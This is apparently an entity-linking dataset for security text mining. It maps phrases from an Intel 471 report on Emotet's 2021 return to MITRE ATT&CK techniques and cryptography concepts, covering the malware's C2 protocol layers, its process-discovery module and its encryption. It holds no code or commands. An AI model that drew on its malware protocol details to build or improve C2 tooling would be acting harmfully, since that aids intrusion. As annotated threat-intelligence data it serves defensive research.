{"mention": "AES", "context_left": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1. Layer 3 (L3) is the encrypted data and contains the encrypted", "context_right": "key, the encrypted data and some randomly generated data as padding. **Protocol changes: L1**", "_context_left": "Layer 3 (L3) is the encrypted data and contains the encrypted ", "_context_right": " key, the encrypted data and some randomly generated data as padding.", "sentence_left": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "sentence_right": "**Protocol changes: L1**", "label": "RSA (Rivest–Shamir–Adleman) is one of the first public-key cryptosystems and is widely used for secure data transmission. In such a cryptosystem, the encryption key is public and it is different from the decryption key which is kept secret (private). In RSA, this asymmetry is based on the practical difficulty of the factorization of the product of two large prime numbers, the \"factoring problem\". The acronym RSA is made of the initial letters of the surnames of Ron Rivest, Adi Shamir, and Leonard Adleman, who first publicly described the algorithm in 1977. Clifford Cocks, an English mathematician working for the British intelligence agency Government Communications Headquarters (GCHQ), had developed an equivalent system in 1973, but this was not declassified until 1997.  A user of RSA creates and then publishes a public key based on two large prime numbers, along with an auxiliary value. The prime numbers must be kept secret. Anyone can use the public key to encrypt a message, but with currently published methods, and if the public key is large enough, only someone with knowledge of the prime numbers can decode the message feasibly. Breaking RSA encryption is known as the RSA problem. Whether it is as difficult as the factoring problem remains an open question.  RSA is a relatively slow algorithm, and because of this, it is less commonly used to directly encrypt user data. More often, RSA passes encrypted shared keys for symmetric key cryptography which in turn can perform bulk encryption-decryption operations at much higher speed.", "label_id": 12592, "label_title": "RSA (cryptosystem)", "label_link": "https://en.wikipedia.org/wiki?curid=25385", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.", "context_left": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1. Layer 3 (L3)", "context_right": "**Protocol changes: L1**", "_context_left": "Layer 3 (L3) ", "_context_right": "", "sentence_left": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "sentence_right": "**Protocol changes: L1**", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**Protocol changes: L1** The old", "context_right": "also used a multilayer communication protocol for all communication performed by the infected victim and the C2. However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "_context_left": "The old ", "_context_right": " also used a multilayer communication protocol for all communication performed by the infected victim and the C2.", "sentence_left": "**Protocol changes: L1**", "sentence_right": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "C2", "context_left": "**Protocol changes: L1** The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the", "context_right": ". However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "_context_left": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the ", "_context_right": ".", "sentence_left": "**Protocol changes: L1**", "sentence_right": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "multilayer communication protocol for all communication performed by the infected victim and the C2.", "context_left": "**Protocol changes: L1** The old Emotet also used a", "context_right": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "_context_left": "The old Emotet also used a ", "_context_right": "", "sentence_left": "**Protocol changes: L1**", "sentence_right": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "C2", "context_left": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2. However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the", "context_right": "during check-in. New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "_context_left": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the ", "_context_right": " during check-in.", "sentence_left": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.", "sentence_right": "New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "enumerate the victim’s process list", "context_left": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2. However, the old protocol required the loader to also", "context_right": ", which was sent to the C2 during check-in. New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "_context_left": "However, the old protocol required the loader to also ", "_context_right": ", which was sent to the C2 during check-in.", "sentence_left": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.", "sentence_right": "New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "label": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.", "label_id": 20, "label_title": "Process Discovery", "label_link": "https://attack.mitre.org/techniques/T1057", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "which was sent to the C2", "context_left": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2. However, the old protocol required the loader to also enumerate the victim’s process list,", "context_right": "during check-in. New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "_context_left": "However, the old protocol required the loader to also enumerate the victim’s process list, ", "_context_right": " during check-in.", "sentence_left": "The old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.", "sentence_right": "New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "label": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "label_id": 195, "label_title": "Exfiltration Over C2 Channel", "label_link": "https://attack.mitre.org/techniques/T1041", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in. New", "context_right": "strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking. The following structure was observed for the new Emotet initial check-in:", "_context_left": "New ", "_context_right": " strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "sentence_left": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "sentence_right": "The following structure was observed for the new Emotet initial check-in:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "focused on process list checking.", "context_left": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in. New Emotet strips out this process checking functionality from initial check-in and places it into a new module", "context_right": "The following structure was observed for the new Emotet initial check-in:", "_context_left": "New Emotet strips out this process checking functionality from initial check-in and places it into a new module ", "_context_right": "", "sentence_left": "However, the old protocol required the loader to also enumerate the victim’s process list, which was sent to the C2 during check-in.", "sentence_right": "The following structure was observed for the new Emotet initial check-in:", "label": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.", "label_id": 20, "label_title": "Process Discovery", "label_link": "https://attack.mitre.org/techniques/T1057", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking. The following structure was observed for the new", "context_right": "initial check-in: ```", "_context_left": "The following structure was observed for the new ", "_context_right": " initial check-in:", "sentence_left": "New Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.", "sentence_right": "```", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "The image depicts the structure for Emotet's initial check-in. A new addition to the", "context_right": "protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in. This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "_context_left": "A new addition to the ", "_context_right": " protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "sentence_left": "The image depicts the structure for Emotet's initial check-in.", "sentence_right": "This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "The image depicts the structure for Emotet's initial check-in. A new addition to the Emotet protocol requirements and", "context_right": "module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in. This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "_context_left": "A new addition to the Emotet protocol requirements and ", "_context_right": " module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "sentence_left": "The image depicts the structure for Emotet's initial check-in.", "sentence_right": "This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "C2", "context_left": "The image depicts the structure for Emotet's initial check-in. A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the", "context_right": "receives the bot’s initial check-in. This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "_context_left": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the ", "_context_right": " receives the bot’s initial check-in.", "sentence_left": "The image depicts the structure for Emotet's initial check-in.", "sentence_right": "This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "context_left": "The image depicts the structure for Emotet's initial check-in. A new addition to the Emotet protocol requirements and Emotet module list,", "context_right": "This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "_context_left": "A new addition to the Emotet protocol requirements and Emotet module list, ", "_context_right": "", "sentence_left": "The image depicts the structure for Emotet's initial check-in.", "sentence_right": "This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "C2", "context_left": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in. This module exclusively grabs the infected victim’s process list, which is sent back to the", "context_right": "using the following L1: ```", "_context_left": "This module exclusively grabs the infected victim’s process list, which is sent back to the ", "_context_right": " using the following L1:", "sentence_left": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "sentence_right": "```", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "grabs the infected victim’s process list", "context_left": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in. This module exclusively", "context_right": ", which is sent back to the C2 using the following L1: ```", "_context_left": "This module exclusively ", "_context_right": ", which is sent back to the C2 using the following L1:", "sentence_left": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "sentence_right": "```", "label": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.", "label_id": 20, "label_title": "Process Discovery", "label_link": "https://attack.mitre.org/techniques/T1057", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "which is sent back to the C2", "context_left": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in. This module exclusively grabs the infected victim’s process list,", "context_right": "using the following L1: ```", "_context_left": "This module exclusively grabs the infected victim’s process list, ", "_context_right": " using the following L1:", "sentence_left": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "sentence_right": "```", "label": "The adversary is trying to steal data. Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.", "label_id": 583, "label_title": "Exfiltration", "label_link": "https://attack.mitre.org/tactics/TA0010", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "```", "context_right": "no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot. Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "_context_left": "", "_context_right": " no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot.", "sentence_left": "```", "sentence_right": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "C2", "context_left": "``` Emotet no longer delivers any modules until the process list module has been received successfully and the", "context_right": "has received the process list from the bot. Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "_context_left": "Emotet no longer delivers any modules until the process list module has been received successfully and the ", "_context_right": " has received the process list from the bot.", "sentence_left": "```", "sentence_right": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "C2 has received the process list from the bot.", "context_left": "``` Emotet no longer delivers any modules until the process list module has been received successfully and the", "context_right": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "_context_left": "Emotet no longer delivers any modules until the process list module has been received successfully and the ", "_context_right": "", "sentence_left": "```", "sentence_right": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.", "label": "The adversary is trying to steal data. Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.", "label_id": 583, "label_title": "Exfiltration", "label_link": "https://attack.mitre.org/tactics/TA0010", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "command buffer received from the C2.", "context_left": "Emotet no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot. Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the", "context_right": "**Protocol Changes: L2**", "_context_left": "Additionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the ", "_context_right": "", "sentence_left": "Emotet no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot.", "sentence_right": "**Protocol Changes: L2**", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**Protocol Changes: L2** L2 for", "context_right": "’s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data. This information is prepended to L1.", "_context_left": "L2 for ", "_context_right": "’s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.", "sentence_left": "**Protocol Changes: L2**", "sentence_right": "This information is prepended to L1.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**Protocol Changes: L3** L3 for", "context_right": "’s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding. The following structure can be observed for L3:", "_context_left": "L3 for ", "_context_right": "’s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.", "sentence_left": "**Protocol Changes: L3**", "sentence_right": "The following structure can be observed for L3:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "ECC", "context_left": "**Protocol Changes: L3** L3 for Emotet’s communication protocol contains the encrypted L2, the", "context_right": "key used to encrypt L2 and some randomly generated data that serves as padding. The following structure can be observed for L3:", "_context_left": "L3 for Emotet’s communication protocol contains the encrypted L2, the ", "_context_right": " key used to encrypt L2 and some randomly generated data that serves as padding.", "sentence_left": "**Protocol Changes: L3**", "sentence_right": "The following structure can be observed for L3:", "label": "Elliptic-curve cryptography (ECC) is an approach to public-key cryptography based on the algebraic structure of elliptic curves over finite fields. ECC requires smaller keys compared to non-EC cryptography (based on plain Galois fields) to provide equivalent security.  Elliptic curves are applicable for key agreement, digital signatures, pseudo-random generators and other tasks. Indirectly, they can be used for encryption by combining the key agreement with a symmetric encryption scheme. They are also used in several integer factorization algorithms based on elliptic curves that have applications in cryptography, such as Lenstra elliptic-curve factorization.", "label_id": 4680, "label_title": "Elliptic-curve cryptography", "label_link": "https://en.wikipedia.org/wiki?curid=9966", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet’s communication protocol contains the encrypted L2", "context_left": "**Protocol Changes: L3** L3 for", "context_right": ", the ECC key used to encrypt L2 and some randomly generated data that serves as padding. The following structure can be observed for L3:", "_context_left": "L3 for ", "_context_right": ", the ECC key used to encrypt L2 and some randomly generated data that serves as padding.", "sentence_left": "**Protocol Changes: L3**", "sentence_right": "The following structure can be observed for L3:", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "the ECC key used to encrypt L2", "context_left": "**Protocol Changes: L3** L3 for Emotet’s communication protocol contains the encrypted L2,", "context_right": "and some randomly generated data that serves as padding. The following structure can be observed for L3:", "_context_left": "L3 for Emotet’s communication protocol contains the encrypted L2, ", "_context_right": " and some randomly generated data that serves as padding.", "sentence_left": "**Protocol Changes: L3**", "sentence_right": "The following structure can be observed for L3:", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "some interesting formatting performed on it that first replaces all nulls with `0xC3`", "context_left": "``` The randomly generated data has", "context_right": ". It then selects a random integer between zero and 14 and writes `0x00`to the offset of that integer.", "_context_left": "The randomly generated data has ", "_context_right": ".", "sentence_left": "```", "sentence_right": "It then selects a random integer between zero and 14 and writes `0x00`to the offset of that integer.", "label": "Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.", "label_id": 415, "label_title": "Data Obfuscation", "label_link": "https://attack.mitre.org/techniques/T1001", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**Loader command table changes** In addition to protocol changes, Intel 471 analysts also observed changes to the new", "context_right": "command table. This table handles module/binary execution and has the following opcodes:", "_context_left": "In addition to protocol changes, Intel 471 analysts also observed changes to the new ", "_context_right": " command table.", "sentence_left": "**Loader command table changes**", "sentence_right": "This table handles module/binary execution and has the following opcodes:", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Injects a module into memory.", "context_left": "| | 2 | Load Module |", "context_right": "|", "_context_left": "| 2 | Load Module | ", "_context_right": "", "sentence_left": "|", "sentence_right": "|", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
